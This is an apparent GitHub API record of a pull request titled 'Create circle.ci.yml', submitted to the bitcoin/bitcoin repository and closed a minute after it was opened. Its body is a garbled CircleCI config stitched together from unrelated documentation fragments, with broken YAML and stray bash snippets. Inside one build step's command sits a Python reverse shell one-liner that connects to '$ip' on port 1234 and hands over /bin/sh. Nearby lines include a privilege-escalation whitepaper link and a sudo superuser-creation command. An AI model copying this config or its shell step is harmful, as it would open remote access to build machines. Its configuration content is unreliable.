{
   "assignee" : null,
   "assignees" : [],
   "author_association" : "NONE",
   "body" : "\r\nversion: 2.1\r\njobs:\r\n  Hello-World:\r\n    docker:\r\n      - image: alpine:3.7\r\n    steps:\r\n      - run:\r\n          name: Hello World\r\n          command: |\r\n            echo 'Hello World!'\r\n            echo 'This is the delivery pipeline'\r\n  I-Have-Code:\r\n    docker:\r\n      - image: alpine:3.7\r\n    steps:\r\n      - checkout\r\n      - run:\r\n          name: Code Has Arrived\r\n          command: |\r\n            ls -al\r\n            echo '^^^That should look familiar^^^'\r\n  Run-With-Node:\r\n    docker:\r\n      - image: circleci/node:10-browsers\r\n    steps:\r\n      - run:\r\n          name: Running In A Container With Node\r\n          command: |\r\n            node -v\r\n  Now-Complete:\r\n    docker:\r\n      - image: alpine:3.7\r\n    steps:\r\n      - run:\r\n          name: Approval Complete\r\n          command: |\r\n            echo 'Do work once the approval has completed'\r\n\r\nworkflows:\r\n version: 2\r\n Example_Workflow:\r\n while [[ \"$1\" =~ ^- && ! \"$1\" == \"--\" ]]; do case $1 in\r\n  -V | --version )\r\n    echo $version\r\n    exit\r\n    ;;\r\n  -s | --string )\r\n    shift; string=$1\r\n    ;;\r\n  -f | --flag )\r\n    flag=1\r\n    ;;\r\nesac; shift; done\r\nif [[ \"$1\" == '--' ]]; then shift; fi\r\n   jobs:\r\n     - Hello-World\r\n     - I-Have-Code:\r\n         requires:\r\n           - Hello-World\r\n     - Run-With-Node:\r\n         requires:\r\n           - Hello-World\r\n     - Hold-For-Approval: traperr() {\r\n  echo \"ERROR: ${BASH_SOURCE[1]} at about ${BASH_LINENO[0]}\"\r\n}\r\n\r\nset -o errtrace\r\ntrap traperr ERR\r\n         type: approval\r\n         requires:\r\n           - Run-With-Node\r\n           - I-Have-Code\r\n     - Now-Complete:\r\n         requires:\r\n           - Hold-For-Approval\r\n           - ~/.circleci/config.yml\r\nversion: 2\r\njobs:\r\n  test:\r\n    docker:\r\n      - image: circleci/<language>:<version TAG>\r\n    parallelism: 4\r\n    steps:\r\n      - run:\r\n          command: |\r\n            echo $(circleci tests glob \"foo/**/*\" \"bar/**/*\")\r\n            circleci tests glob \"foo/**/*\" \"bar/**/*\" | xargs -n 1 echo\r\n--timings-type flag.\r\ncat my_java_test_classnames | circleci tests split --split-by=timings --timings-type=classname\r\ncircleci tests glob \"test/**/*.java\" | circleci tests split\r\nversion: 2.1\r\n  jobs:\r\n   build:\r\n    machine:\r\n      image: ubuntu-1604:201903-0. \r\n      # recommended linux image - includes Ubuntu 16.04, docker 18.09.3,   docker-compose 1.23.1\r\n  resource_class: 2xlarge\r\n    steps:\r\n      ... // other config\r\n     build:\r\n      executor: win/2xlarge\r\n    steps:\r\n      - run: Write-Host 'Hello, World'\r\n    build: \r\n      run:\r\n        command: ./ci/$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$ip\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\r\n     working_directory: ~/.sh-python\r\n      environment: https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562\r\n       FOO: bar\r\nsteps:\r\n  - run:\r\n     name: Running tests\r\n       command: make test  \r\n    - run:\r\n        command: |\r\n           echo Running test\r\n      mkdir -p /tmp/test-results\r\n  make test:\r\n    steps:\r\n      - run:\r\n          name: Testing application\r\n            command: make test\r\n               shell: /bin/bash\r\n      working_directory: ~/my-app\r\n      no_output_timeout: 30m\r\n        environment:\r\n          FOO: bar\r\n      - run: echo 127.0.0.1 devhost | sudo tee-a /etc/hosts -  \r\n      - run: |  sudo -u root createuser -h      localhost--superuser ubuntu && sudo createdb -h localhost test_db\r\n      - run:\r\n          name: Upload Failed Tests\r\n            command: curl --data fail_tests.log\r\n              http://example.com/error_logs\r\n                when: on_fail jobs: # conditional\r\nsteps may also be. defined in  commands:`job_with_optional_custom_checkout:\r\n   parameters:\r\n     custom_checkout:\r\n       type: string\r\n          default: \"\"\r\n             machine: true\r\n               steps:\r\n                  - when:\r\n                  - condition: <<parameters.custom_checkout>>\r\n                steps:\r\n                  - run: echo \"my custom checkout\"\r\n                  - unless:\r\n                     condition:\r\n<<parameters.custom_checkout>>\r\n                 steps:\r\n                  - checkout\r\n                       workflows:\r\n                          build-test-deploy:\r\n                  jobs:               -job_with_optional_custom_checkout:\r\ncustom_checkout: \"any non-empty\r\n          string is truthy\"                    -job_with_optional_custom_checkout\r\n                    - checkout\r\n                    - run: git submodule sync\r\n                    - run: git submodule update --init - \r\n                    - run:}} \r\n                    - name: Build the Jekyll site\r\n                       command: bundle exec jekyll build --source jekyll --destination jekyll/_site/docs/\r\n                    - store_artifacts:\r\n                        path: jekyll/_site/docs/\r\n                           destination: circleci-docs\r\n                    - myapp-{{ .Branch }}-{{ checksum \"package-lock.json\" \r\n",
   "closed_at" : "2020-03-02T04:23:47Z",
   "closed_by" : {
      "avatar_url" : "https://avatars2.githubusercontent.com/u/863730?v=4",
      "events_url" : "https://api.github.com/users/fanquake/events{/privacy}",
      "followers_url" : "https://api.github.com/users/fanquake/followers",
      "following_url" : "https://api.github.com/users/fanquake/following{/other_user}",
      "gists_url" : "https://api.github.com/users/fanquake/gists{/gist_id}",
      "gravatar_id" : "",
      "html_url" : "https://github.com/fanquake",
      "id" : 863730,
      "login" : "fanquake",
      "node_id" : "MDQ6VXNlcjg2MzczMA==",
      "organizations_url" : "https://api.github.com/users/fanquake/orgs",
      "received_events_url" : "https://api.github.com/users/fanquake/received_events",
      "repos_url" : "https://api.github.com/users/fanquake/repos",
      "site_admin" : false,
      "starred_url" : "https://api.github.com/users/fanquake/starred{/owner}{/repo}",
      "subscriptions_url" : "https://api.github.com/users/fanquake/subscriptions",
      "type" : "User",
      "url" : "https://api.github.com/users/fanquake"
   },
   "comments" : 0,
   "comments_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/18237/comments",
   "created_at" : "2020-03-02T04:23:03Z",
   "events_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/18237/events",
   "html_url" : "https://github.com/bitcoin/bitcoin/pull/18237",
   "id" : 573706823,
   "labels" : [],
   "labels_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/18237/labels{/name}",
   "locked" : false,
   "milestone" : null,
   "node_id" : "MDExOlB1bGxSZXF1ZXN0MzgyMTY1MDIz",
   "number" : 18237,
   "pull_request" : {
      "diff_url" : "https://github.com/bitcoin/bitcoin/pull/18237.diff",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/18237",
      "patch_url" : "https://github.com/bitcoin/bitcoin/pull/18237.patch",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/18237"
   },
   "repository_url" : "https://api.github.com/repos/bitcoin/bitcoin",
   "state" : "closed",
   "title" : "Create circle.ci.yml",
   "updated_at" : "2020-03-02T04:23:47Z",
   "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/18237",
   "user" : {
      "avatar_url" : "https://avatars1.githubusercontent.com/u/43480274?v=4",
      "events_url" : "https://api.github.com/users/zachwylde00/events{/privacy}",
      "followers_url" : "https://api.github.com/users/zachwylde00/followers",
      "following_url" : "https://api.github.com/users/zachwylde00/following{/other_user}",
      "gists_url" : "https://api.github.com/users/zachwylde00/gists{/gist_id}",
      "gravatar_id" : "",
      "html_url" : "https://github.com/zachwylde00",
      "id" : 43480274,
      "login" : "zachwylde00",
      "node_id" : "MDQ6VXNlcjQzNDgwMjc0",
      "organizations_url" : "https://api.github.com/users/zachwylde00/orgs",
      "received_events_url" : "https://api.github.com/users/zachwylde00/received_events",
      "repos_url" : "https://api.github.com/users/zachwylde00/repos",
      "site_admin" : false,
      "starred_url" : "https://api.github.com/users/zachwylde00/starred{/owner}{/repo}",
      "subscriptions_url" : "https://api.github.com/users/zachwylde00/subscriptions",
      "type" : "User",
      "url" : "https://api.github.com/users/zachwylde00"
   }
}
